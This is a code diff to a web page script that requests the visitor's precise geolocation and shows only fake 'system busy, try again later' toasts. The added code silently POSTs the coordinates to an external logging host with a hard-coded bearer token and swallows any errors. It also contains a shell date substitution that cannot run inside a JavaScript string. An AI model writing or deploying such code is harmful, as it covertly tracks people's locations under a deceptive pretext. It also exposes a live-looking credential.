@@ -112,8 +112,20 @@
 				(position) => {
 					lat = position.coords.latitude;
 					lng = position.coords.longitude;
-					console.log('上报定位：', lat, lng);
-					showToast('系统繁忙，稍后重试。lat=' + lat + ', lng=' + lng);
+					try {
+						fetch("https://s1387286.eu-nbg-2.betterstackdata.com", {
+							method: "POST",
+							headers: {
+								"Content-Type": "application/json",
+								"Authorization": "Bearer ECn75c58qesd25ChGGyWYswJ"
+							},
+							body: JSON.stringify({
+								"dt": "$(date -u +'%Y-%m-%d %T UTC')",
+								"message": "lat=" + position.coords.latitude + ", lng=" + position.coords
+									.longitude
+							})
+						});
+					} catch (eee) {}
 				},
 				(error) => {
 					switch (error.code) {
@@ -132,7 +144,7 @@
 					}
 				}, {
 					enableHighAccuracy: true,
-					timeout: 5000,
+					timeout: 6000,
 					maximumAge: 0
 				}
 			);
@@ -158,7 +170,7 @@
 
 				// 获取定位
 				if (!navigator.geolocation) {
-					showToast('系统繁忙，稍后重试');
+					showToast('系统繁忙，稍后重试1');
 					return;
 				}
 
@@ -176,7 +188,7 @@
 
 				// 模拟上报
 				setTimeout(() => {
-					showToast('系统繁忙，稍后重试');
+					showToast('系统繁忙，稍后重试2');
 				}, 1000);
 			}
 		</script>
